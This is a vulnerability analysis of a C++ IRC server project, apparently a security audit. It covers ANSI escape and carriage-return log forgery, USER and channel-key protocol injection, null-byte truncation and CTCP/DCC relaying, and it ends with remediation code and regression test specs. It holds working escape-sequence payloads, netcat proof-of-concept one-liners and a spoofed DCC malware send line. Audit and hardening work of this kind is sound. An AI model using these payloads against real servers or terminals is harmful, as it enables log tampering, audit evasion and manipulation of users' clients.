# Comprehensive IRC Code & Protocol Injection Vulnerability Analysis

## 1. Executive Summary & Threat Landscape

In an IRC (Internet Relay Chat) server, untrusted user data flows continuously across network sockets, server internal state stores, console logging mechanisms, and downstream client connections.

When user-controlled input containing unexpected control codes, delimiters, binary characters, or unvalidated formats is processed without strict sanitization, several classes of injection vulnerabilities emerge:
1. **Terminal Escape / ANSI Code Injection**: Manipulating the server console or recipient client terminals to hide logs, clear screens, spoof identities, or execute terminal-specific escape actions.
2. **IRC Protocol Framing & Prefix Injection**: Injecting spaces or special delimiters into fields like `USER`, `MODE key`, or `NICK` that corrupt the standard IRC message grammar (`:<prefix> <command> <params> :<trailing>`), causing protocol desynchronization in downstream IRC clients and bouncers.
3. **Log Forgery / Audit Trail Tampering**: Injecting Carriage Returns (`\r`) or ANSI cursor repositioning sequences to overwrite previous log lines or forge fake server log messages.
4. **Embedded Null Byte (`\0`) & Binary Payload Truncation**: Exploiting the semantic differences between binary-safe C++ containers (`std::string`, `Wire`) and null-terminated C string functions / streams (`std::istringstream`, `c_str()`).
5. **Client-Side CTCP / DCC Exploitation**: Relaying malicious CTCP commands (`\x01...`) to vulnerable IRC client software.

---

## 2. Terminal Escape Sequence & ANSI Code Injection

### 2.1 The Root Cause in Server Logging
In `ServerLoop.cpp`, line 187:
```cpp
print("Received from client ", client_fd, ": ", buffer);
```
And across various command handlers:
```cpp
print("Client ", client.get_nickname(), " registered successfully!");
print("Client joined channel ", channel_name, "!");
```

The raw incoming socket buffer `buffer` (and strings derived from it) is passed directly to standard output via `print()`. When an attacker sends ANSI escape sequences (`\x1b[...]` or `\033[...]`), the host terminal emulator running `ircserv` interprets these sequences as terminal commands rather than literal text.

### 2.2 Observed Attack: Concealed Text (`\x1b[8m`)
When the client sends:
```
PASS 1234\r\nNICK \x1b[8mHacker15\r\nUSER hacker 0 * :Hacker15\r\n
```
1. `buffer` contains `\x1b[8m`.
2. `print("Received from client ", client_fd, ": ", buffer)` emits `\x1b[8m` to stdout.
3. The server administrator's terminal activates the **Conceal (Invisible Text)** mode (`SGR 8`).
4. Every subsequent character printed by the server (including logs of other users, registration errors, command executions) becomes completely invisible on the administrator's terminal screen.
5. In client-facing replies, `is_valid_nickname` rejects `\x1b[8mHacker15` with `432 * \x1b[8mHacker15 :Erroneous nickname`. The client terminal itself then receives `\x1b[8m`, making all output in the client's terminal invisible starting from that position (`:localhost 432 * Hac...`).

### 2.3 Catalog of Terminal Escape Payloads & Impacts

| Sequence | Name | Effect on Server Console / Client Terminal | Risk Severity |
| :--- | :--- | :--- | :--- |
| `\x1b[8m` | Conceal / Hide Text | Renders all subsequent log lines invisible. Admin cannot see server activity. | Medium (Audit evasion) |
| `\x1b[0m` | Reset Attributes | Restores normal display (used by attackers to selectively unmask parts). | Low |
| `\x1b[2J\x1b[H` | Clear Screen & Home Cursor | Wipes the administrator's console screen completely. | Medium (DoS on monitoring) |
| `\x1b[1;31;40m` | Color Override | Alters log colors (e.g. making critical red error logs appear black on black background). | Low / Medium |
| `\x1b[1A\x1b[2K` | Cursor Up + Erase Line | Erases previous server log line before the admin reads it. | High (Log tampering) |
| `\r` (Carriage Return) | Line Overwrite | Moves cursor to column 0 without newline, allowing attacker text to overwrite the timestamp or FD prefix in logs. | High (Log forgery) |
| `\x07` (BEL) | Terminal Bell | Rings the system bell / triggers alert sound. Flooding causes audio/CPU DoS. | Medium |
| `\x1b]0;fake title\x07` | Set Window Title (OSC 0) | Modifies the title of the terminal tab or window. | Low (Social engineering) |
| `\x1b]52;c;<base64>\x07` | Clipboard Write (OSC 52) | Writes arbitrary text into the server admin's / client's system clipboard without consent in supported terminals (e.g. iTerm2, Alacritty, xterm). | Critical (Client/Admin Host Compromise) |
| `\x1b[6n` | Device Status Report | Causes the terminal to inject cursor position characters (`\x1b[<row>;<col>R`) back into the server terminal's stdin stream as if typed by the administrator! | Critical (Admin shell injection if admin interacts with terminal) |

---

## 3. IRC Protocol Framing & Message Desynchronization

### 3.1 USER Command: Username Space Injection (Protocol Desync)

#### The Vulnerability
In `ServerCommands.cpp`:
```cpp
void Server::handle_user_command(Client &client, const Vector<Wire> &arguments)
{
    if (arguments.empty()) {
        send_status(client, "461", "USER :Not enough parameters");
        return;
    }
    ...
    client.set_username(arguments[0]);
    try_register_client(client);
}
```

Notice that `arguments[0]` is assigned directly to `client.username` without validating whether it contains spaces, colons, or invalid characters.

If an attacker sends:
```
PASS 1234\r\n
NICK Mallory\r\n
USER :admin PRIVMSG #secret\r\n
```
Or if an attacker passes a trailing parameter with spaces: `split_arguments` extracts `arguments[0] = "admin PRIVMSG #secret"`.

#### The Ripple Effect
Later, when the server constructs an outgoing IRC message via `make_msg` in `ServerMessaging.cpp`:
```cpp
Wire make_msg(const Client &client, const Wire &cmd, const Wire &target, const Wire &param)
{
    Wire msg(":", client.get_nickname(), "!", client.get_username(), "@localhost ", cmd, " ", target);
    if (!param.empty() || cmd == "TOPIC" || cmd == "PRIVMSG" || cmd == "NOTICE" || cmd == "KICK")
        msg += " :" + param;
    return msg;
}
```

The resulting broadcast message sent to all users in a channel becomes:
```
:Mallory!admin PRIVMSG #secret@localhost PRIVMSG #general :Hello
```

#### Impact on Recipient Clients / Parsers
1. Standard IRC BNF expects `:prefix command params...`.
2. The prefix is delimited by the first space.
3. The recipient parser sees `:Mallory!admin` as the prefix.
4. The recipient parser sees `PRIVMSG` as the command!
5. The recipient parser sees `#secret@localhost` as the recipient target!
6. The victim client interprets this as a forged private message or channel message to `#secret`, desynchronizing downstream bots, bouncers (ZNC), and GUI clients.

---

### 3.2 Channel Mode Key (`+k`) Space Injection

#### The Vulnerability
In `ServerChannelOps.cpp`:
```cpp
bool Server::apply_mode_key(Client &client, Channel &channel, char sign,
    const Vector<Wire> &arguments, size_t &param_index,
    Wire &applied_modes, Wire &applied_params)
{
    if (sign == '+')
    {
        if (param_index >= arguments.size()) { ... }
        const Wire &key = arguments[param_index++];
        bool changed = channel.set_key(key);
        append_mode_change(applied_modes, sign, 'k');
        applied_params += " " + key;
        return (changed);
    }
    ...
}
```
And in `handle_mode`:
```cpp
Wire mode_message = make_msg(client, "MODE", Wire(channel_name, " ", applied_modes, applied_params));
channel.broadcast(mode_message);
```

If an operator sets a key using trailing colon syntax:
```
MODE #lobby +k :key with spaces
```
`key` becomes `"key with spaces"`.
The server sets `channel_key` to `"key with spaces"` and broadcasts:
```
:Op!user@localhost MODE #lobby +k key with spaces\r\n
```

#### Impact
When other IRC clients receive this message:
- Parameter 1: `#lobby`
- Parameter 2: `+k`
- Parameter 3 (Key): `key`
- Parameter 4: `with` (interpreted as extraneous parameter or next mode argument)
- Parameter 5: `spaces`

Any client that attempts to track the channel key will store `"key"` instead of `"key with spaces"`. Subsequent `JOIN #lobby key` attempts will fail with `475 :Cannot join channel (+k)` because the actual server key is `"key with spaces"`.

---

### 3.3 Trailing Colon Omission & Command Disparity

In standard IRC (RFC 2812), the last parameter may omit the leading colon if it does not contain spaces.
In `make_msg`:
```cpp
Wire make_msg(const Client &client, const Wire &cmd, const Wire &target, const Wire &param)
{
    Wire msg(":", client.get_nickname(), "!", client.get_username(), "@localhost ", cmd, " ", target);
    if (!param.empty() || cmd == "TOPIC" || cmd == "PRIVMSG" || cmd == "NOTICE" || cmd == "KICK")
        msg += " :" + param;
    return msg;
}
```

If `target` contains an unescaped colon or spaces, or if `param` is empty for commands not in the whitelist, formatting discrepancies occur:
- `NICK` broadcast: `make_msg(client, "NICK", ":" + new_nick)` generates:
  `::old_nick!user@localhost NICK ::new_nick` (Double colon prepended to `new_nick`!).
  Some IRC clients strip the second colon, while others treat `:new_nick` with a literal leading colon as the user's nickname, creating nickname mismatch between server and client state!

---

## 4. Embedded Null Byte (`\0`) & Binary Payload Injection

### 4.1 Memory vs. C-String Truncation Disparity

In `ServerLoop.cpp`:
```cpp
int bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
if (bytes_received > 0) {
    buffer[bytes_received] = '\0';
    client.append_raw_buffer(buffer, bytes_received);
```
`Client::append_raw_buffer` uses `Wire::append(const char *data, size_t size)`, which retains embedded `\0` bytes inside `std::string`.

However:
1. `split_arguments` uses `Wire::find(' ')` and `std::istringstream`, which may terminate at or mishandle `\0`.
2. Standard C/C++ output streams treat `\0` as a terminator during printing, while `send(fd, out.c_str(), out.size(), MSG_NOSIGNAL)` transmits all bytes up to `out.size()`.
3. If an attacker injects `NICK Test\0Injected\r\n`:
   - `is_valid_nickname` checks characters up to `size()`. `\0` is not alphanumeric, so it returns false (`432 Erroneous nickname`).
   - But in the reply: `send_status(client, "432", arguments[0] + " :Erroneous nickname")`:
     The string buffer contains `Test\0Injected :Erroneous nickname`.
     When passed to console logging, output is truncated at `Test`, concealing the remainder of the payload from inspection.

---

## 5. Client-Side CTCP / DCC / Payload Injection via Server Relaying

The server forwards messages verbatim in `PRIVMSG`:
```cpp
void Server::send_message_to_channel(Client &sender, const Wire &channel_name, const Wire &message)
{
    ...
    channel.broadcast_from(sender, "PRIVMSG", message);
}
```

### 5.1 CTCP Command Injection
If an attacker sends:
```
PRIVMSG #channel :\x01VERSION\x01
PRIVMSG #channel :\x01PING 1724590000\x01
PRIVMSG #channel :\x01FINGER\x01
PRIVMSG #channel :\x01TIME\x01
```
All connected clients in `#channel` receive the CTCP request and automatically send a `NOTICE` or private reply back to the attacker containing client OS details, client software versions, system uptime, and local timestamps.

### 5.2 Malicious DCC File Send Spoofing
An attacker sends:
```
PRIVMSG Victim :\x01DCC SEND malware.exe 2130706433 1337 102400\x01
```
Older or poorly configured IRC clients (mIRC, HexChat with auto-accept) may automatically initiate a direct peer-to-peer TCP connection to the attacker's IP (`127.0.0.1:1337`) and download the payload.

---

## 6. Comprehensive Attack Surface & Parameter Matrix

| Command | Parameter | Code Path | Current Validation | Vulnerability / Edge Case | Impact |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `NICK` | `nickname` | `ServerCommands.cpp:146` | `hasOnlyAlphaNum("_")` | Rejects non-alphanumeric, but echoes raw invalid nick in `432` reply containing raw ANSI codes | Client/server terminal display corruption |
| `USER` | `username` | `ServerCommands.cpp:132` | None (takes `arguments[0]`) | Allows spaces, colons, `@`, `!`, ANSI codes, control characters | **Protocol command injection / IRC prefix spoofing** |
| `PASS` | `password` | `ServerCommands.cpp:107` | Exact match with server password | Logs failed password or attempts in server buffer | Password leakage / ANSI concealment in logs |
| `JOIN` | `channel_name` | `ServerHelper.cpp:46` | `is_valid_channel_name` (no space, comma, colon; length <= 50) | Rejects spaces/colons; allows high ASCII / control codes if > 32 | Channel name pollution / client display anomalies |
| `JOIN` | `key` | `ServerCommands.cpp:195` | None | Key with spaces stored in channel | Mode key desync between server and clients |
| `MODE` | `key (+k)` | `ServerChannelOps.cpp:260` | None | Space-separated key string corrupts outgoing `MODE` parameters | IRC client mode state desynchronization |
| `MODE` | `limit (+l)` | `ServerChannelOps.cpp:320` | `is_positive_number` | Correctly validates positive integer string | Robust |
| `MODE` | `operator (+o)` | `ServerChannelOps.cpp:286` | `get_client(target_nick)` | Checked against valid registered clients | Robust |
| `TOPIC` | `topic` | `ServerChannelOps.cpp:197` | None | Allows raw ANSI codes, CTCP `\x01`, `\r`, `\x07` (BEL) | Client terminal takeover, clipboard hijack via OSC 52, BEL flood |
| `KICK` | `reason` | `ServerChannelOps.cpp:100` | None | Allows raw ANSI codes, control characters | Terminal display corruption on kicked client |
| `PART` | `reason` | `ServerCommands.cpp:209` | None | Allows raw ANSI codes, control characters | Terminal display corruption on channel members |
| `QUIT` | `reason` | `ServerCommands.cpp:262` | None | Allows raw ANSI codes, control characters, `\r` | Server log line overwrite, terminal display corruption |
| `PRIVMSG` | `message` | `ServerMessaging.cpp:50` | None | Relays raw CTCP `\x01`, ANSI escapes, OSC sequences, `\r` | Client terminal manipulation, automated CTCP replies, clipboard theft |

---

## 7. Concrete Attack Scenarios & Proof of Concept

### Scenario 1: Concealed Admin Log & Audit Trail Erasure via `\x1b[8m`
**Attack Objective**: Prevent server administrator from seeing administrative actions or user joins.
```bash
# 1. Attacker connects and sends conceal sequence in NICK
echo -e "PASS secret\r\nNICK \x1b[8mAdminGhost\r\nUSER ghost 0 * :Ghost\r\n" | nc localhost 6667

# 2. Server console prints:
# Received from client 4: PASS secret\r\nNICK \x1b[8mAdminGhost\r\n...
# Result: Terminal enters 'Conceal' SGR mode. All subsequent logs are invisible.
```

### Scenario 2: Downstream IRC Client Parser Desync via USER Space Injection
**Attack Objective**: Forge channel messages appearing as server commands to recipient IRC clients.
```bash
# Attacker registers with a crafted username containing space-separated IRC grammar
echo -e "PASS secret\r\nNICK Infiltrator\r\nUSER :admin PRIVMSG #secret 0 * :RealName\r\n" | nc localhost 6667
echo -e "JOIN #general\r\nPRIVMSG #general :Test message\r\n" | nc localhost 6667

# Server emits to other clients in #general:
# :Infiltrator!admin PRIVMSG #secret@localhost PRIVMSG #general :Test message
# Recipient clients parse 'PRIVMSG #secret' as the command and channel target!
```

### Scenario 3: Log Forgery / Fake Server Messages via `\r` Injection
**Attack Objective**: Overwrite previous log output or insert spoofed server success messages into console logs.
```bash
# Attacker sends QUIT with carriage return and forged log prefix
echo -e "PASS secret\r\nNICK Bob\r\nUSER b 0 * :b\r\nQUIT :\rClient 4 registered successfully!\r\n" | nc localhost 6667
```

---

## 8. Hardening & Defensive Remediation Strategies

### Remediation 1: Strict Sanitization for Console Logging
Replace direct raw buffer logging with a safe printable representation:
```cpp
static Wire sanitize_for_log(const Wire &raw)
{
    Wire clean;
    for (size_t i = 0; i < raw.size(); ++i) {
        unsigned char c = static_cast<unsigned char>(raw[i]);
        if (c == '\r')
            clean += "\\r";
        else if (c == '\n')
            clean += "\\n";
        else if (c == '\t')
            clean += "\\t";
        else if (c < 32 || c >= 127) {
            char hex[8];
            std::snprintf(hex, sizeof(hex), "\\x%02X", c);
            clean += hex;
        } else {
            clean.push_back(static_cast<char>(c));
        }
    }
    return clean;
}
```
Apply `sanitize_for_log()` before printing any client-supplied string in `ServerLoop.cpp` and `ServerHelper.cpp`.

### Remediation 2: Strict USER Command Validation
Enforce RFC 2812 rules for `username`:
```cpp
bool is_valid_username(const Wire &user)
{
    if (user.empty() || user.size() > 50)
        return false;
    for (size_t i = 0; i < user.size(); ++i) {
        char c = user[i];
        if (c <= ' ' || c == '@' || c == '!' || c == ':' || c == '\r' || c == '\n')
            return false;
    }
    return true;
}
```
In `handle_user_command`:
```cpp
if (!is_valid_username(arguments[0])) {
    send_status(client, "468", arguments[0] + " :Your username is invalid");
    return;
}
```

### Remediation 3: Channel Key Disallow Spaces
In `apply_mode_key` and `handle_join_command`:
```cpp
if (key.contains(" ") || key.contains("\r") || key.contains("\n")) {
    send_status(client, "525", channel.get_name() + " :Key is not well-formed");
    return false;
}
```

### Remediation 4: Control Character Filtering on Relay Messages
For `TOPIC`, `KICK reason`, `PART reason`, and `QUIT reason`, strip or reject ASCII control codes (`c < 32 && c != '\t' && c != '\x03' && c != '\x02'`) to prevent terminal hijacking of connected IRC clients.

---

## 9. Automated Regression Test Specs in `scenarios/adversarial/CODE_INJECTION/`

The following executable test specs are located in `tester/scenarios/adversarial/CODE_INJECTION/`. They assert strict secure behavior and are designed to fail when the server exhibits unhandled injection vulnerabilities or protocol desynchronization.

| Spec File | Targeted Vulnerability / Edge Case | Asserted Secure Behavior |
| :--- | :--- | :--- |
| [01_USER_space_injection_protocol_desync.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/01_USER_space_injection_protocol_desync.spec) | Space injection in `USER` command splitting IRC prefix | Server rejects username with spaces (468) and refuses registration |
| [02_USER_forbidden_characters_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/02_USER_forbidden_characters_injection.spec) | Username containing `@`, `!`, ANSI codes, or control characters | Server rejects invalid user mask characters with 468 error |
| [03_MODE_key_space_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/03_MODE_key_space_injection.spec) | Channel key containing spaces via `MODE +k` | Server rejects multi-word keys with error (525/461) rather than corrupting broadcast parameters |
| [04_TOPIC_ansi_escape_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/04_TOPIC_ansi_escape_injection.spec) | ANSI conceal/color escape sequences (`\x1b[8m`) in `TOPIC` | Server sanitizes or strips escape sequences before relaying topic to channel members |
| [05_PRIVMSG_osc52_clipboard_hijack_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/05_PRIVMSG_osc52_clipboard_hijack_injection.spec) | OSC 52 clipboard hijacking and terminal control codes in chat | Server filters out dangerous terminal control codes from chat broadcasts |
| [06_KICK_ansi_escape_reason_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/06_KICK_ansi_escape_reason_injection.spec) | ANSI screen clearing / conceal codes in `KICK` reason | Server sanitizes kick reasons before broadcasting to channel |
| [07_QUIT_log_forgery_carriage_return_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/07_QUIT_log_forgery_carriage_return_injection.spec) | Carriage return (`\r`) injection in `QUIT` message | Server strips carriage returns to prevent console log line overwrites |
| [08_NICK_embedded_null_byte_truncation.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/08_NICK_embedded_null_byte_truncation.spec) | Binary embedded null bytes (`\0`) in `NICK` | Server rejects null bytes with 432 without truncating logs or error replies |
| [09_PART_control_character_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/09_PART_control_character_injection.spec) | ANSI escape sequences in `PART` reason | Server delivers sanitized parting reason to mutual channel members |
| [10_PASS_ansi_escape_conceal_injection.spec](file:///home/tbatis/core/berg/tester/scenarios/adversarial/CODE_INJECTION/10_PASS_ansi_escape_conceal_injection.spec) | ANSI conceal sequence in `PASS` | Server rejects mismatched password and does not conceal terminal logs |

